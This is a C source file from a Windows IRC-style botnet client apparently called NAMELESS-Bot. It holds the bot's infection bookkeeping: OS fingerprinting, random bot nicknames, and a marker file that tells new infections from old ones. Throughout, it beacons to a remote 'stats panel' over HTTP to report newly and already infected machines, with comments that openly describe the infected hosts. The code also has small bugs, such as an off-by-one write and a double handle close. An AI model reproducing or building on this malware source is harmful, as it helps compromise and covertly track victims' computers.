/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

#include "global.h"
#include <wininet.h>

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

char *Create_Random_Letter(unsigned int len)
{
    char			*nick;
    unsigned int	i;

    if (len == 0 || len > 16)
        len = rand()%(16-3) + 3;

    nick = (char *) malloc (len + 1);

    for (i = 0; i <= len; i++)
        nick[i] = (rand()%26) + 97;

    nick[len] = 0;

    return nick;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

char *My_OS_Type(void)
{
    char *dwRet = win_unk; //OS_UNKNOWN;

    OSVERSIONINFO verinfo;
    OSVERSIONINFOEX verinfo_ex;
    verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    if (GetVersionEx(&verinfo))
    {
        if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) dwRet = win_2k; //OS_WIN2K;
        else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) dwRet = win_xp; //OS_WINXP;
        else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) dwRet = win_2k3; //OS_WIN2K3;
        else if (verinfo.dwMajorVersion == 6 && verinfo.dwMinorVersion == 0) dwRet = win_vista; //OS_VISTA
        else if (verinfo.dwMajorVersion == 6 && verinfo.dwMinorVersion == 1) dwRet = win_7; // OS_WIN7
        else dwRet = win_unk; //OS_UNKNOWN;
    }
    else
        dwRet = win_unk; // OS_UNKNOWN;

    return (dwRet);
}

char *My_Nick_Type(void)
{
    char *tmp,*nick,*ctr;
    char *userprofile = getenv(my_userprofile); //getenv("USERPROFILE");
    char filename[MAX_PATH], installpath[MAX_PATH];

    GetModuleFileName(GetModuleHandle(NULL), filename, sizeof(filename)); // Grab current filename
    sprintf(installpath, "%s\\%s", userprofile, exename); // C:\Documents and Settings\User

    HANDLE hFile, FileHandle;

    int len=(rand()%5)+7,i;
    nick=(char*)malloc(len+1024);
    memset(nick,0,len+1+20);
    ctr=(char*)malloc(1024);
    memset(ctr,0,1024);
    tmp=(char*)malloc(len+1024);
    memset(tmp,0,len+1);
    srand( (unsigned)time( NULL ) );
    for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;

    if (strcmp(filename, installpath))  //if filename == installation path then check if new, else its old / hasn't rebooted once.
    {
        hFile = CreateFile("j0780707.dat",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

        if (hFile == INVALID_HANDLE_VALUE)
        {
            //connect to our stat center & denote that we're new
            WebPanel_Connect_New();

            //creates special nick, ex; NEW-WIN-ABCDEFG
            strcat(nick,"N");
            strcat(nick,"-");
            strcat(nick, My_OS_Type());
            strcat(nick,"-");
            strcat(nick, tmp);

            //create file so we're not "new" on reboot
            FileHandle = CreateFile("j0780707.dat", GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
            if (FileHandle != INVALID_HANDLE_VALUE)
                CloseHandle(FileHandle);
            CloseHandle(FileHandle);
            CloseHandle(hFile); //close files

            return nick; //send nick out
        }
        else
            //bots currently already infected..

            WebPanel_Connect_Current();

            //nick = WIN-ABCDEFG
            strcat(nick, My_OS_Type());
            strcat(nick,"-");
            strcat(nick, tmp);

            CloseHandle(hFile); //close file

            return nick; //send nick out
    }
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

unsigned int Resolve_This_Host(char *host)
{
    struct	hostent		*hp;
    unsigned int		host_ip;

    host_ip = my_inet_addr(host);
    if (host_ip == INADDR_NONE)
    {
        hp = my_gethostbyname(host);
        if (hp == 0)
            return 0;
        else
            host_ip = *(u_int *)(hp->h_addr);
    }

    return host_ip;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

/************************************************************************************\
|* start threads                                                                    *|
\************************************************************************************/
void Thread_Prepare()
{
    int		i;

    for (i = 0; i < MAX_THREADS; i++)
    {
        threads[i].tHandle = NULL;
        threads[i].type = NONE;
    }
}

int Thread_Add(thread_type type)
{
    int		i;

    for (i = 0; i < MAX_THREADS; i++)
        if (threads[i].tHandle == NULL)
            break;

    if (i == MAX_THREADS)
        i = -1;
    else
        threads[i].type = type;

#ifdef DEBUG
    printf("Adding thread number: %d\n", i);
#endif

    return i;
}

int Thread_Check(thread_type type)
{
    int		i,
    k = 0;

    for (i = 0; i < MAX_THREADS; i++)
        if (threads[i].type == type)
            k++;

    return k;
}

void Thread_Clear(int num)
{
    threads[num].tHandle = NULL;
    threads[num].type = NONE;
    my_closesocket(threads[num].tsock);
}

int Thread_Kill(thread_type type)
{
    int		i,
    k = 0;

    for (i = 0; i < MAX_THREADS; i++)
    {
        if (threads[i].type == type)
        {
            TerminateThread(threads[i].tHandle, 0);
            Thread_Clear(i);
            k++;
        }
    }

    return k;
}

HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait)
{
    DWORD		id = 0;
    HANDLE		tHandle;

    tHandle = CreateThread(NULL, 0, function, (LPVOID)param, 0, &id);

    if (wait)
    {
        WaitForSingleObject(tHandle, INFINITE);
        CloseHandle(tHandle);
    }
    else
        Sleep(THREAD_WAIT_TIME);

    return tHandle;
}

/************************************************************************************\
|* end threads                                                                      *|
\************************************************************************************/


/* Web Panel Shit */
int WebPanel_Connect_New()
{
    char location[256];
    HINTERNET hInternet;
    DWORD dwContext;

    hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
    sprintf(location, "%s?new", statspanel);

    if (InternetOpenUrl(hInternet, location, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, dwContext) == NULL)
    {
        return -1; // -1 = error
    }
    else
    {
        InternetCloseHandle(hInternet);
        return 1;
    }
}

int WebPanel_Connect_Current()
{
    char location[256];
    HINTERNET hInternet;
    DWORD dwContext;

    hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
    sprintf(location, "%s?current", statspanel);

    if (InternetOpenUrl(hInternet, location, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, dwContext) == NULL)
    {
        return -1; // -1 = error
    }
    else
    {
        InternetCloseHandle(hInternet);
        return 1;
    }
}
